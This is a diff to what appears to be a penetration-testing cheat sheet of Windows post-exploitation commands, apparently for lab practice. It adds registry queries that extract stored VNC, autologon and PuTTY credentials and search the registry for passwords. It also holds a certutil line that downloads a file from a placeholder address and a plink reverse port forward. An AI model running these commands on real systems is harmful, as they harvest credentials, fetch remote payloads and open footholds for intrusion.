@@ -145,6 +145,14 @@ shell
 			| dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 			| where /R C:\ user.txt
 			| where /R C:\ *.ini
+			
+	| REGISTRY QUERY
+		| reg query "HKCU\Software\ORL\WinVNC3\Password" : VNC
+		| reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" : Windows Autologon
+		| reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" : SNMP Parameters
+		| reg query "HKCU\Software\SimonTatham\PuTTy\Sessions" : Putty 
+		| reg query HKLM /f password /t REG_SZ /s : Password search in Registry
+		| reg query HKCU /f password /t REG_SZ /s : Password search in Registry
 	
 	| netsh wlan show profile : List SSIDs
 		| netsh wlan show profile <SSID> key=clear : Show SSID pass in plain text
@@ -158,8 +166,12 @@ shell
 		| netsh firewall show state : Display the state of the firewall
 		| netsh firewall show config : Display firewall configuration
 		
-Transfer files:
-	| certutil -urlcache -f xxx.xxx.xxx.xxx:xxxx/file.something file.saveas
+		
+	| Transfer files:
+		| certutil -urlcache -f xxx.xxx.xxx.xxx:xxxx/file.something file.saveas
+	
+	| Port forwarding with Plink
+		| plink.exe -l <username> -pw <password> -R 445:127.0.0.1:445 10.10.xxx.xxx
 	
 =======================
 ===ENUMERATION TOOLS===
